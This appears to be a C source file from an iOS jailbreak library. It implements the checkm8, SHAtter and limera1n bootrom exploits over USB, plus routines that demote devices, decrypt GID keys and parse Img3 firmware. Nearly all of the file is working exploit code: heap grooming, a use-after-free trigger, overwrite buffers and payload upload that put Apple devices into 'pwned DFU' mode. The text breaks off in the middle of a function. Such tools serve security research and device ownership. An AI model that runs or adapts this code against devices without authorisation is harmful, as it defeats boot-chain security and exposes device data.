#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <openssl/aes.h>

#include <include/libexploit.h>
#include <include/payload_gen.h>
#include <include/exploit/shatter_payload.h>

#ifdef DEBUG
#define debug(x, args...) printf("[DEBUG] "x"\n", ##args)
#else
#define debug(x, args...)
#endif

#define S5l8950X_OVERWRITE (unsigned char*)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00"
#define S5l8955X_OVERWRITE S5l8950X_OVERWRITE

#define S5l8960X_OVERWRITE (unsigned char*)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x38\x80\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

#define AES_DECRYPT_IOS 0x11
#define AES_GID_KEY 0x20000200

#define IMG3_HEADER     0x496d6733
#define ARMv7_VECTOR    0xEA00000E
#define IMG3_ILLB       0x696c6c62
#define IMG3_IBSS       0x69627373
#define IMG3_DATA       0x44415441
#define IMG3_KBAG       0x4B424147

uint32_t memc = 0x6D656D63;
uint32_t exec = 0x65786563;

size_t read32_demote_sz = 28;
size_t write32_demote_sz = 32;
size_t read64_demote_sz = 40;
size_t write64_demote_sz = 44;

exploit_log_cb exploit_log = NULL;
exploit_prog_cb exploit_prog = NULL;

static void default_log_cb(char* msg) {
#ifndef DEBUG
    printf("%s", msg);
#endif
}

static void default_prog_cb(unsigned int progress) {
#ifndef DEBUG
    int i = 0;
    
    if(progress < 0) return;
    if(progress > 100) progress = 100;
    
    printf("\r[");
    for(i = 0; i < 50; i++) {
        if(i < progress / 2) {
            printf("=");
        } else {
            printf(" ");
        }
    }
    
    printf("] %3.1d%%", progress);
    fflush(stdout);
    
    if(progress == 100) printf("\n");
#endif
}


void usb_stall(usb_device_t device){
	unsigned char buf[0xC0];
	memset(buf, 'A', 0xC0);
	usb_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, buf, 0xC0, 0.00001);
}

void usb_leak(usb_device_t device){
    unsigned char buf[0xc0];
	usb_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, buf, 0xC0, 1);
}

void usb_no_leak(usb_device_t device){
    unsigned char buf[0xc1];
	usb_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, buf, 0xC1, 1);
}

void usb_req_stall(usb_device_t device){
	usb_ctrl_transfer(device, 0x2, 3, 0x0, 0x80, NULL, 0, 10);
}

void usb_req_leak(usb_device_t device){
    unsigned char buf[0x40];
	usb_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, buf, 0x40, 2);
}

void usb_req_leak64(usb_device_t device){
    unsigned char buf[0x40];
    usb_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, buf, 0x40, 0.3);
}

void usb_req_no_leak(usb_device_t device){
    unsigned char buf[0x41];
	usb_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, buf, 0x41, 1);
}

int reset_counters(usb_device_t device){
    return usb_ctrl_transfer(device, 0x21, 4, 0, 0, NULL, 0, 100);
}

void get_data(usb_device_t device, int amount){
        unsigned char part[amount];
        usb_ctrl_transfer(device, 0xA1, 2, 0, 0, part, amount, 100);
}

void get_data2048(usb_device_t device, int amount){
    unsigned char part[0x800];
    int i;
    for(i=0; i<amount; i+=0x800){
        usb_ctrl_transfer(device, 0xA1, 2, 0, 0, part, 0x800, 100);
    }
}

void send_data(usb_device_t device, unsigned char* data, size_t size){
    usb_ctrl_transfer(device, 0x21, 1, 0, 0, data, size, 100);
}

int checkm8_supported(usb_device_t device) {
	uint16_t cpid = usb_get_cpid(device);
	switch(cpid) {
		case 0x8950:
			return 0;
		case 0x8955:
			return 0;
        case 0x8960:
            return 0;
		default:
			return -1;
	}
}

int shatter_supported(usb_device_t device) {
    uint16_t cpid = usb_get_cpid(device);
    switch(cpid) {
        case 0x8930:
            return 0;
        default:
            return -1;
    }
}

int limera1n_supported(usb_device_t device) {
    uint16_t cpid = usb_get_cpid(device);
    switch(cpid) {
        case 0x8920:
            return 0;
        case 0x8922:
            return 0;
        case 0x8930:
            return 0;
        default:
            return -1;
    }
}

int get_exploit_configuration(uint16_t cpid, uint16_t* large_leak, uint16_t* hole, uint16_t* overwrite_offset, uint16_t* leak, unsigned char** overwrite, size_t* overwrite_len) {
	switch(cpid) {
		case 0x8950:
			*large_leak = 659;
			*hole = 0;
			*overwrite_offset = 0x640;
			*leak = 0;
			*overwrite = S5l8950X_OVERWRITE;
			*overwrite_len = 28;
			return 0;
		case 0x8955:
			*large_leak = 659;
			*hole = 0;
			*overwrite_offset = 0x640;
			*leak = 0;
			*overwrite = S5l8955X_OVERWRITE;
			*overwrite_len = 28;
			return 0;
        case 0x8960:
            *large_leak = 7936;
            *hole = 0;
            *overwrite_offset = 0x580;
            *leak = 0;
            *overwrite = S5l8960X_OVERWRITE;
            *overwrite_len = 0x30;
            return 0;
		default:
			error("no exploit configuration is available for this device.");
			return -1;
	}
}

usb_device_t checkm8_exploit(usb_device_t device) {
	LOG("*** based on checkm8 exploit by axi0mX\n");
    LOG("**  pwned dfu for 32-bit devices based on belladonna by synackuk\n");
    LOG("**  improved by dora2_yururi\n");
    
	int ret;
	unsigned char buf[0x800];
	memset(buf, 'A', 0x800);
	uint16_t large_leak;
	uint16_t hole;
	uint16_t overwrite_offset;
	uint16_t leak;
	unsigned char* overwrite;
	size_t overwrite_len;
	unsigned char* payload;
	size_t payload_len;
	uint16_t cpid = usb_get_cpid(device);
	ret = get_exploit_configuration(cpid, &large_leak, &hole, &overwrite_offset, &leak, &overwrite, &overwrite_len);
	if(ret != 0) {
		error("failed to get exploit configuration.");
		return NULL;
	}

	char* identifier = usb_get_identifier(device);
	if(!identifier) {
		error("failed to get device identifier.");
		return NULL;
	}

	ret = get_payload_configuration(cpid, identifier, &payload, &payload_len);
	if(ret != 0) {
		error("failed to get payload configuration.");
		return NULL;
	}
 
#ifdef DEBUG
    FILE * f;
    f = fopen(".debug_payload.bin", "wb");
    fwrite(payload, payload_len, 1, f);
    fclose(f);
#endif
    
    double prog = 0;
    LOG("\nexploiting checkm8...\n");
    default_prog_cb(prog); // 0%
    
    debug("reset");
    usb_reset(device); prog += 1;
    default_prog_cb(prog); // 1%
    
    debug("reconnect");
	device = usb_reconnect(device, 0); prog += 1;
	if(!device) {
		error("failed to re-connect to device.");
		return NULL;
	}
    default_prog_cb(prog); // 2%

	debug("Grooming heap");
	if(large_leak) {
        debug("usb_req_stall");
		usb_req_stall(device); prog += 5;
        default_prog_cb(prog); // 7%
        
        switch(cpid) {
            case 0x8960:
                usleep(500000);
                break;
            default:
                usleep(100000);
                break;
        }
        debug("usb_req_leak");
        double nextprog = 0;
		for(double i = 0; i < large_leak; i++) {
            //debug("usb_req_leak: %x",i);
            double progress = ((i/(large_leak-1))*30);
            default_prog_cb(progress + prog);
            
            switch(cpid) {
                case 0x8960:
                    usb_req_leak64(device);
                    break;
                default:
                    usb_req_leak(device);
                    break;
            }
            
            nextprog = progress;
        } // 37 %
        
        prog += nextprog;
        debug("usb_req_no_leak");
		usb_req_no_leak(device); prog += 3;
        default_prog_cb(prog); // 40 %
	}
	else {
        debug("usb_stall");
		usb_stall(device); prog += 6;
        default_prog_cb(prog); // 8%
        
        debug("usb_no_leak");
        double nextprog = 0;
		for(double i = 0; i < hole; i++) {
            double progress = ((i/(hole-1))*30);
            default_prog_cb(progress + prog);
			usb_no_leak(device);
            nextprog = progress;
		} // 38%
        
        prog += nextprog;
        debug("usb_leak");
		usb_leak(device); prog += 1;
        default_prog_cb(prog); // 39%
        debug("usb_no_leak");
		usb_no_leak(device); prog += 1;
        default_prog_cb(prog); // 40 %
	}
    // 40%
    
    debug("reset");
    usb_reset(device); prog += 1;
    default_prog_cb(prog); // 41%
    
    debug("reconnect");
	device = usb_reconnect(device, 0); prog += 1;
	if(!device) {
		error("failed to re-connect to device.");
		return NULL;
	}
    default_prog_cb(prog); // 42%

	debug("preparing for overwrite");
	ret = usb_async_ctrl_transfer(device, 0x21, 1, 0, 0, buf, 0x800, 0.0001); prog += 8;
	if(ret != 0) {
		error("failed to prepare for overwrite.");
		return NULL;
	}
    default_prog_cb(prog); // 50%
    
    debug("Advance buffer offset before triggering the UaF to prevent trashing the heap");
	usb_ctrl_transfer(device, 0, 0, 0, 0, buf, overwrite_offset, 10); prog += 6;
    default_prog_cb(prog); // 56%
	usb_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0, 0); prog += 6;
    default_prog_cb(prog); // 62%
    
    debug("release_interface");
    libusb_release_interface(device->handle, 0); prog += 1;
    default_prog_cb(prog); // 63%
    
    usleep(50000);
    debug("reconnect");
	device = usb_reconnect(device, 0); prog += 2;
	if(!device) {
		error("failed to re-connect to device.");
		return NULL;
	}
    default_prog_cb(prog); // 65%

	debug("overwriting task struct");
    debug("usb_req_stall");
	usb_req_stall(device); prog += 5;
    default_prog_cb(prog); // 70%
	if(large_leak) {
        debug("usb_req_leak");
		usb_req_leak(device); prog += 10;
        default_prog_cb(prog); // 80%
	}
	else {
        debug("usb_req_leak");
        double nextprog = 0;
		for(double i = 0; i < leak; i++) {
            double progress = ((i/(leak-1))*10);
            default_prog_cb(progress + prog);
			usb_req_leak(device);
            nextprog = progress;
		}
        prog += nextprog;
	}
    debug("overwrite");
	usb_ctrl_transfer(device, 0, 0, 0, 0, overwrite, overwrite_len, 10); prog += 5;
    default_prog_cb(prog); // 85%
    
	debug("uploading payload");
    usb_ctrl_transfer(device, 0x21, 1, 0, 0, payload, payload_len, 50); prog += 10;
    default_prog_cb(prog); // 95%
    
	debug("executing payload");
    usleep(50000); prog += 1;
    default_prog_cb(prog); // 96%
    
    debug("reset");
	usb_reset(device); prog += 2;
    default_prog_cb(prog); // 98%
    
    debug("reconnect");
	device = usb_reconnect(device, 1); prog += 1;
    default_prog_cb(prog); // 99%
    
    free(payload);
	if(!device) {
		error("failed execute payload.");
		return NULL;
	}
	ret = usb_is_pwned_dfu(device); prog += 1;
	if(!ret) {
		error("exploit failed! device is \"NOT\" in pwned DFU mode.");
		return NULL;
	}
    
    default_prog_cb(prog); // 100%
	LOG("device is now in pwned DFU mode\n");
    
	return device;
}

usb_device_t shatter_exploit(usb_device_t device) {
    
    int ret;
    LOG("*** based on SHAtter exploit (segment overflow) by posixninja and pod2g\n");
    
    unsigned char *payload = malloc(shatter_payload_length);
    size_t payload_len = shatter_payload_length;
    memcpy(payload, shatter_payload, shatter_payload_length);
    
    if(reset_counters(device) != 0){
        error("exploit failed! failed resetting USB counters...");
    }
    
    debug("get_data");
    get_data(device, 0x40);
    debug("reset");
    usb_reset(device);
    debug("reconnect");
    device = usb_reconnect(device, 0);
    debug("image_validation");
    usb_request_image_validation(device);
    debug("reconnect");
    device = usb_reconnect(device, 0);
    debug("get_data");
    get_data2048(device, 0x2C000);
    debug("release_interface");
    libusb_release_interface(device->handle, 0);
    debug("reconnect");
    device = usb_reconnect(device, 0);
    
    if(reset_counters(device) != 0){
        error("exploit failed! failed resetting USB counters...");
    }
    
    get_data(device, 0x140);
    debug("reset");
    usb_reset(device);
    debug("reconnect");
    device = usb_reconnect(device, 0);
    debug("image_validation");
    usb_request_image_validation(device);
    debug("reconnect");
    device = usb_reconnect(device, 0);
    debug("send_data");
    send_data(device, payload, payload_len);
    debug("get_data");
    get_data2048(device, 0x2C000);
    debug("release_interface");
    libusb_release_interface(device->handle, 0);
    debug("reconnect");
    device = usb_reconnect(device, 0);
    
    ret = usb_is_pwned_dfu(device);
    if(!ret) {
        error("exploit failed! device is \"NOT\" in pwned DFU mode.");
        return NULL;
    }
    LOG("device is now in pwned DFU mode\n");
    
    return device;
}

usb_device_t limera1n_exploit(usb_device_t device) {
    LOG("*** based on limera1n exploit (heap overflow) by geohot\n");
    
    unsigned char *payload;
    size_t payload_len;
    unsigned char assert[1];
    unsigned char buf[0x800];
    memset(buf, 'A', 0x800);
    int ret;
    int rom;
    
    debug("get cpid");
    uint16_t cpid = usb_get_cpid(device);
    
    if(cpid == 0x8920){
        rom = i3gs_bootrom(device); // 0:old, 1:new
    }
    
    if(cpid != 0x8920){
        rom = 2;
    }
    
    debug("gen payload");
    gen_limera1n(cpid, rom, &payload, &payload_len);
    
    debug("send_data");
    send_data(device, payload, payload_len);
    if(usb_ctrl_transfer(device, 0xA1, 1, 0, 0, assert, 1, 100) != 1){
        error("exploit failed! device is \"NOT\" in pwned DFU mode.");
        return NULL;
    }
    
    ret = usb_async_ctrl_transfer(device, 0x21, 1, 0, 0, buf, 0x800, 10);
    if(ret != 0) {
        error("exploit failed! device is \"NOT\" in pwned DFU mode.");
        return NULL;
    }
    
    usb_ctrl_transfer(device, 0x21, 2, 0, 0, NULL, 0, 100);
    
    debug("reset");
    usb_reset(device);
    debug("reconnect");
    device = usb_reconnect(device, 0);
    debug("image_validation");
    usb_request_image_validation(device);
    debug("release_interface");
    libusb_release_interface(device->handle, 0);
    debug("reconnect");
    device = usb_reconnect(device, 0);
    
    ret = usb_is_pwned_dfu(device);
    if(!ret) {
        error("exploit failed! device is \"NOT\" in pwned DFU mode.");
        return NULL;
    }
    LOG("device is now in pwned DFU mode\n");
    
    return device;
}

char* get_srtg(usb_device_t device) {
    char* srtg_ptr = strstr((char*)device->serial, "SRTG:");
    if(!srtg_ptr) {
        return NULL;
    }
    return srtg_ptr;
}

exploit_list* exploits = NULL;
usb_device_t device = NULL;

void exploits_exit() {
    exploit_list* exploit = exploits;
    exploit_list* to_free;
    while(exploit != NULL) {
        to_free = exploit;
        exploit = to_free->next;
        free(to_free);
    }
    exploits = NULL;
}

int libexploit_exploit() {
    int ret;
    ret = usb_is_pwned_dfu(device);
    if(ret) {
        return 0;
    }
    exploit_list* curr = exploits;
    while(curr != NULL) {
        ret = curr->supported(device);
        if(ret == 0){
            device = curr->exploit(device);
            if(!device) {
                error("failed to enter pwned DFU mode.");
                return -1;
            }
            return 0;
        }
        curr = curr->next;
    }
    return -1;
}

int libexploit_get_device() {
    if(device) {
        usb_close(device);
        device = NULL;
    }
    device = usb_get_device_handle();
    if(!device) {
        return -1;
    }
    
    if(!usb_is_dfu(device)) {
        return -1;
    }
    
    return 0;
}

int libexploit_compatible() {
    exploit_list* curr = exploits;
    int ret;
    while(curr != NULL) {
        ret = curr->supported(device);
        if(ret == 0){
            return 0;
        }
        curr = curr->next;
    }
    error("this is not a supported device.");
    return -1;
}

void libexploit_exit() {
    if(device){
        usb_close(device);
        device = NULL;
    }
    usb_exit();
    exploits_exit();
}

void exploit_add(char* name, exploit_supported supported, exploit_func exploit) {
    exploit_list* new_exploit = malloc(sizeof(exploit_list));
    new_exploit->name = name;
    new_exploit->supported = supported;
    new_exploit->exploit = exploit;
    new_exploit->next = exploits;
    exploits = new_exploit;
}

static void checkm8_init() {
    exploit_add("checkm8", &checkm8_supported, &checkm8_exploit);
}

static void shatter_init() {
    exploit_add("SHAtter", &shatter_supported, &shatter_exploit);
}

static void limera1n_init() {
    exploit_add("limera1n", &limera1n_supported, &limera1n_exploit);
}

void libexploit_set_log_cb(exploit_log_cb new_cb) {
    exploit_log = new_cb;
}

void libexploit_set_prog_cb(exploit_prog_cb new_cb) {
    exploit_prog = new_cb;
}

void libexploit_init() {
    usb_init();
    libexploit_set_log_cb(&default_log_cb);
    libexploit_set_prog_cb(&default_prog_cb);
}

int boot_ibss_checkm8(usb_device_t device, char* ibss, size_t ibss_len) {
    debug("boot_ibss_checkm8");
    unsigned char buf[16];
    debug("boot_ibss_checkm8");
    bzero(buf, 16);
    debug("boot_ibss_checkm8");
    int ret;
    ret = usb_send_buffer(device, buf, 16);
    debug("boot_ibss_checkm8");
    if(ret != 0) {
        error("failed to send blank packet.");
        return -1;
    }
    ret = usb_ctrl_transfer(device, 0x21, 1, 0, 0, 0, 0, 100);
    debug("boot_ibss_checkm8");
    if(ret != 0) {
        error("failed to send blank packet.");
        return -1;
    }
    ret = usb_ctrl_transfer(device, 0xA1, 3, 0, 0, buf, 6, 100);
    debug("boot_ibss_checkm8");
    if(ret < 0) {
        error("failed to request status.");
        return -1;
    }
    ret = usb_ctrl_transfer(device, 0xA1, 3, 0, 0, buf, 6, 100);
    debug("boot_ibss_checkm8");
    if(ret < 0) {
        error("failed to request status.");
        return -1;
    }
    LOG("uploading soft DFU\n");
    usb_send_buffer(device, (unsigned char*)ibss, ibss_len);
    LOG("executing soft DFU\n");
    usb_ctrl_transfer(device, 0xA1, 2, 0xFFFF, 0, buf, 0, 100);
    return 0;
}

int boot_ibss_normal(char* ibss, size_t ibss_len) {
    int ret;
    LOG("uploading soft DFU\n");
    ret = usb_send_buffer(device, (unsigned char*)ibss, ibss_len);
    if(ret != 0) {
        error("failed to upload soft DFU.");
        return -1;
    }
    LOG("executing soft DFU\n");
    ret = usb_request_image_validation(device);
    if(ret != 0) {
        error("failed to execute soft DFU.");
        return -1;
    }
    return 0;
}

int demote_checkm8(usb_device_t device){
    debug("demote device");
    void* response;
    
    void* payload_read_demote;
    void* payload_write_demote;
    size_t payload_read_demote_sz;
    size_t payload_write_demote_sz;
    
    
    uintptr_t demote_register;
    uintptr_t new_demote_register;
    uintptr_t demotion_reg;
    uintptr_t dfu_image_base;
    uint16_t cpid;
    uint8_t bit;
    
    int response_len = 0x14;
    unsigned char buf[16];
    bzero(buf, 16);
    
    response = malloc(response_len);
    
    cpid = usb_get_cpid(device);
    switch(cpid) {
        case 0x8947:
            demotion_reg   = 0x3F500000;
            dfu_image_base = 0x34000000;
            bit=32;
            payload_read_demote_sz = read32_demote_sz;
            payload_write_demote_sz = write32_demote_sz;
            break;
        case 0x8950:
            demotion_reg   = 0x3F500000;
            dfu_image_base = 0x10000000;
            bit=32;
            payload_read_demote_sz = read32_demote_sz;
            payload_write_demote_sz = write32_demote_sz;
            break;
        case 0x8955:
            demotion_reg   = 0x3F500000;
            dfu_image_base = 0x10000000;
            bit=32;
            payload_read_demote_sz = read32_demote_sz;
            payload_write_demote_sz = write32_demote_sz;
            break;
        case 0x8960:
            demotion_reg   = 0x000000020E02A000;
            dfu_image_base = 0x0000000180380000;
            bit=64;
            payload_read_demote_sz = read64_demote_sz;
            payload_write_demote_sz = write64_demote_sz;
            break;
        default:
            printf("this device is not supported\n");
            return -1;
    }
    
    payload_read_demote = malloc(payload_read_demote_sz);
    payload_write_demote = malloc(payload_write_demote_sz);
    bzero(payload_read_demote, payload_read_demote_sz);
    bzero(payload_write_demote, payload_write_demote_sz);
    
    debug("make read payload");
    switch(bit) {
            case 64: /* 64-bit */
                *((uint32_t*)payload_read_demote+0) = memc; // uint32_t
                *((uint32_t*)payload_read_demote+1) = memc; // uint32_t
                *((uint64_t*)payload_read_demote+2) = dfu_image_base + 16 + (0 * 8); // load_base + 16 + (index * 4)
                *((uint64_t*)payload_read_demote+3) = demotion_reg;
                *((uint64_t*)payload_read_demote+4) = 4;
                break;
            
            default: /* 32-bit */
                *((uint32_t*)payload_read_demote+0) = memc;
                *((uint32_t*)payload_read_demote+1) = memc;
                *((uint32_t*)payload_read_demote+4) = dfu_image_base + 16 + (0 * 4); // load_base + 16 + (index * 4)
                *((uint32_t*)payload_read_demote+5) = demotion_reg;
                *((uint32_t*)payload_read_demote+6) = 4;
                break;
    }
    
    debug("usb reset");
    usb_reset(device);
    debug("reconnect");
    device = usb_reconnect(device, 0);
    
    debug("send blank packet");
    send_data(device, buf, 16);
    debug("request status");
    usb_ctrl_transfer(device, 0x21, 1, 0, 0, NULL, 0, 10);
    usb_ctrl_transfer(device, 0xA1, 3, 0, 0, buf, 6, 10);
    usb_ctrl_transfer(device, 0xA1, 3, 0, 0, buf, 6, 10);
    
    debug("send data");
    send_data(device, payload_read_demote, payload_read_demote_sz);

    debug("execute data");
    usb_ctrl_transfer(device, 0xA1, 2, 0xFFFF, 0, response, 0x14, 50);
    
    demote_register = *((uint32_t*)response+4);
    printf("demotion register: 0x%lx\n", demote_register);
    
    if(demote_register & 1){
        printf("attempting to demote device.\n");
        
        debug("make write payload");
        switch(bit) {
            case 64:
                *((uint32_t*)payload_write_demote+0) = memc; // uint32_t
                *((uint32_t*)payload_write_demote+1) = memc; // uint32_t
                *((uint64_t*)payload_write_demote+2) = demotion_reg;
                *((uint64_t*)payload_write_demote+3) = dfu_image_base + 16 + (3 * 8); // load_base + 16 + (index * 4)
                *((uint64_t*)payload_write_demote+4) = 4;
                *((uint32_t*)payload_write_demote+(5*2/* uint32_t */)) = demote_register & 0xFFFFFFFE;
                break;
                
            default: /* 32-bit */
                *((uint32_t*)payload_write_demote+0) = memc;
                *((uint32_t*)payload_write_demote+1) = memc;
                *((uint32_t*)payload_write_demote+4) = demotion_reg;
                *((uint32_t*)payload_write_demote+5) = dfu_image_base + 16 + (3 * 4); // load_base + 16 + (index * 4)
                *((uint32_t*)payload_write_demote+6) = 4;
                *((uint32_t*)payload_write_demote+7) = demote_register & 0xFFFFFFFE;
                break;
        }
        
        debug("usb reset");
        usb_reset(device);
        debug("reconnect");
        device = usb_reconnect(device, 0);
        
        debug("send blank packet");
        send_data(device, buf, 16);
        debug("request status");
        usb_ctrl_transfer(device, 0x21, 1, 0, 0, NULL, 0, 10);
        usb_ctrl_transfer(device, 0xA1, 3, 0, 0, buf, 6, 10);
        usb_ctrl_transfer(device, 0xA1, 3, 0, 0, buf, 6, 10);
        
        debug("send data");
        send_data(device, payload_write_demote, payload_write_demote_sz);
        free(payload_write_demote);
        
        debug("execute data");
        usb_ctrl_transfer(device, 0xA1, 2, 0xFFFF, 0, NULL, 0, 50);
        
        debug("usb reset");
        usb_reset(device);
        debug("reconnect");
        device = usb_reconnect(device, 0);
        
        debug("send blank packet");
        send_data(device, buf, 16);
        debug("request status");
        usb_ctrl_transfer(device, 0x21, 1, 0, 0, NULL, 0, 10);
        usb_ctrl_transfer(device, 0xA1, 3, 0, 0, buf, 6, 10);
        usb_ctrl_transfer(device, 0xA1, 3, 0, 0, buf, 6, 10);
        
        debug("send data");
        send_data(device, payload_read_demote, payload_read_demote_sz);
        free(payload_read_demote);
        
        debug("execute data");
        usb_ctrl_transfer(device, 0xA1, 2, 0xFFFF, 0, response, 0x14, 50);
        
        new_demote_register = *((uint32_t*)response+4);
        
        free(response);
        
        printf("demotion register: 0x%lx\n", new_demote_register);
        if(new_demote_register != demote_register){
            printf("demote: success\n");
        } else {
            printf("demote: failed\n");
            usb_close(device);
            return -1;
        }
        
    } else {
        printf("device is already demoted.\n");
    }

    usb_close(device);
    
    return 0;
}

int aes(usb_device_t device, uint8_t* IV, uint8_t* Key, void* inbuf, void** outbuf, size_t outsz){
    debug("AES");
    void* payload;
    void* response;
    size_t payload_sz;
    size_t data_sz;
    size_t response_len;
    uint16_t cpid;
    uint32_t dfu_image_base;
    uint32_t aes_crypto_cmd;
    
    uint8_t decIV[16];
    uint8_t decKey[32];
    
    cpid = usb_get_cpid(device);
    
    switch(cpid) {
        case 0x8950:
            dfu_image_base = 0x10000000;
            aes_crypto_cmd = 0x7300+1;
            break;
        case 0x8955:
            dfu_image_base = 0x10000000;
            aes_crypto_cmd = 0x7340+1;
            break;
        default:
            printf("this device is not supported\n");
            return -1;
    }
    
    payload_sz = 0x5c;
    data_sz = 0x30;
    response_len = 64;
    
    payload = malloc(payload_sz);
    bzero(payload, payload_sz);
    response = malloc(response_len);
    bzero(response, response_len);
    unsigned char buf[16];
    bzero(buf, 16);
    
    *(uint32_t*)(payload+ 0) = exec;
    *(uint32_t*)(payload+ 4) = exec;
    *(uint32_t*)(payload+ 8) = aes_crypto_cmd;
    *(uint32_t*)(payload+16) = AES_DECRYPT_IOS;
    *(uint32_t*)(payload+20) = dfu_image_base + 16 + (7 * 4);
    *(uint32_t*)(payload+24) = dfu_image_base + 16 + (0 * 4);
    *(uint32_t*)(payload+28) = data_sz;
    *(uint32_t*)(payload+32) = AES_GID_KEY;
    for(int i = 0; i < 16; i++){
        *(uint8_t*)(payload+44+i) = IV[i];
    }
    for(int i = 0; i < 32; i++){
        *(uint8_t*)(payload+44+16+i) = Key[i];
    }
    
    debug("send blank packet");
    send_data(device, buf, 16);
    debug("request status");
    usb_ctrl_transfer(device, 0x21, 1, 0, 0, NULL, 0, 10);
    usb_ctrl_transfer(device, 0xA1, 3, 0, 0, buf, 6, 10);
    usb_ctrl_transfer(device, 0xA1, 3, 0, 0, buf, 6, 10);
    
    debug("send data");
    send_data(device, payload, payload_sz);
    free(payload);
    
    debug("execute data");
    usb_ctrl_transfer(device, 0xA1, 2, 0xFFFF, 0, response, response_len, 100);
    
    for(int i = 0; i < 16; i++){
        decIV[i] = *(uint8_t*)(response+16+i);
    }
    for(int i = 0; i < 32; i++){
        decKey[i] = *(uint8_t*)(response+16+16+i);
    }
    
    free(response);
    
    uint8_t my_iv[16];
    int i;
    uint8_t bKey[32];
    int keyBits = 32*8;
    for (i = 0; i < 16; i++) {
        my_iv[i] = decIV[i] & 0xff;
    }
    for (i = 0; i < (keyBits/8); i++) {
        bKey[i] = decKey[i] & 0xff;
    }
    AES_KEY dec_key;
    AES_set_decrypt_key(bKey, keyBits, &dec_key);
    
    uint8_t ivec[16];
    memcpy(ivec, my_iv, 16);
    
    int size = outsz;
    *outbuf = malloc(size);
    
    AES_cbc_encrypt((unsigned char *) (inbuf),
                    (unsigned char *) (*outbuf),
                    size,
                    &dec_key,
                    ivec,
                    AES_DECRYPT);

    return 0;
}

typedef struct img3Tag {
    uint32_t magic;            // see below
    uint32_t totalLength;      // length of tag including "magic" and these two length values
    uint32_t dataLength;       // length of tag data
    // ...
} Img3RootHeader;

typedef struct img3File {
    uint32_t magic;       // ASCII_LE("Img3")
    uint32_t fullSize;    // full size of fw image
    uint32_t sizeNoPack;  // size of fw image without header
    uint32_t sigCheckArea;// although that is just my name for it, this is the
    // size of the start of the data section (the code) up to
    // the start of the RSA signature (SHSH section)
    uint32_t ident;       // identifier of image, used when bootrom is parsing images
    // list to find LLB (illb), LLB parsing it to find iBoot (ibot),
    // etc.
    struct img3Tag  tags[];      // continues until end of file
} Img3Header;

typedef struct Unparsed_KBAG_256 {
    uint32_t magic;       // string with bytes flipped ("KBAG" in little endian)
    uint32_t fullSize;    // size of KBAG from beyond that point to the end of it
    uint32_t tagDataSize; // size of KBAG without this 0xC header
    uint32_t cryptState;  // 1 if the key and IV in the KBAG are encrypted with the GID Key
    // 2 is used with a second KBAG for the S5L8920, use is unknown.
    uint32_t aesType;     // 0x80 = aes128 / 0xc0 = aes192 / 0x100 = aes256
    uint8_t encIV_start;    // IV for the firmware file, encrypted with the GID Key
 // ...   // Key for the firmware file, encrypted with the GID Key
} UnparsedKbagAes256_t;

int check_img3_file_format(usb_device_t device, void* file, size_t sz, void** out, size_t* outsz){
    uint32_t Img3header_magic = *(uint32_t*)(file + offsetof(struct img3File, magic));
    switch(Img3header_magic) {
        case ARMv7_VECTOR:
            debug("Decrypted Img3 image");
            *out = malloc(sz);
            *outsz = sz;
            memcpy(*out, file, *outsz);
            return 0;
            break;
            
        case IMG3_HEADER:
            debug("Img3 image");
            uint32_t ibss_data_start;
            uint32_t tag_header = 0;
            int isKBAG = 0;
            uint8_t IV[16];
            uint8_t Key[32];
            
            uint32_t img3_ident = *(uint32_t*)(file + offsetof(struct img3File, ident));
            debug("ident : 0x%08x", img3_ident);
            if (img3_ident == IMG3_ILLB || img3_ident == IMG3_IBSS){
                printf("Detect iBSS/LLB image\n");
            } else {
                printf("Invalid image\n");
                return -1;
            }
            
            uint32_t img3_fullSize = *(uint32_t*)(file + offsetof(struct img3File, fullSize));
            uint32_t img3_sizeNoPack = *(uint32_t*)(file + offsetof(struct img3File, sizeNoPack));
            
            uint32_t next = img3_fullSize - img3_sizeNoPack;
            
            for(uint32_t next_tag = next; next_tag < img3_fullSize;){
                uint32_t img3_tag_magic = *(uint32_t*)(file + next_tag + offsetof(struct img3Tag, magic));
                debug("tag magic: 0x%08x", img3_tag_magic);
                uint32_t img3_tag_totalLength = *(uint32_t*)(file + next_tag + offsetof(struct img3Tag, totalLength));
                debug("tag totalLength: 0x%08x", img3_tag_totalLength);
                uint32_t img3_tag_dataLength = *(uint32_t*)(file + next_tag + offsetof(struct img3Tag, dataLength));
                debug("tag dataLength: 0x%08x", img3_tag_dataLength);
                
                if(img3_tag_magic == IMG3_DATA) {
                    tag_header = img3_tag_magic;
                    *outsz = img3_tag_dataLength;
                    ibss_data_start = next_tag + offsetof(struct img3Tag, dataLength) + 4;
                }
                
                if(img3_tag_magic == IMG3_KBAG) {
                    debug("KBAG");
                    if(*(uint32_t*)(file + next_tag + offsetof(struct Unparsed_KBAG_256, cryptState)) == 1){
                        isKBAG = 1;
                        uint32_t tagDataSize = *(uint32_t*)(file + next_tag + offsetof(struct Unparsed_KBAG_256, tagDataSize));
                        debug("tagDataSize: 0x%08x", tagDataSize);
                        for(int i = 0; i < 16; i++){
                            IV[i] = *(uint8_t*)(file + next_tag + offsetof(struct Unparsed_KBAG_256, encIV_start)+i);
                        }
                        for(int i = 0; i < 32; i++){
                            Key[i] = *(uint8_t*)(file + next_tag + offsetof(struct Unparsed_KBAG_256, encIV_start)+16+i);
                        }
                    }
                }
                
                next_tag += img3_tag_totalLength;
            }
            
            if(tag_header != IMG3_DATA) {
                printf("Invalid image\n");
                return -1;
            }
            
            debug("decrypted sz: 0x%08zx", *outsz);
            debug("decrypted image offset: 0x%08x", ibss_data_start);
            
            if(isKBAG == 1 && *(uint32_t*)(file + ibss_data_start) != IMG3_DATA){
                void* fuck = malloc(*outsz);
                memcpy(fuck, file+ibss_data_start, *outsz);
                void* fuck2;
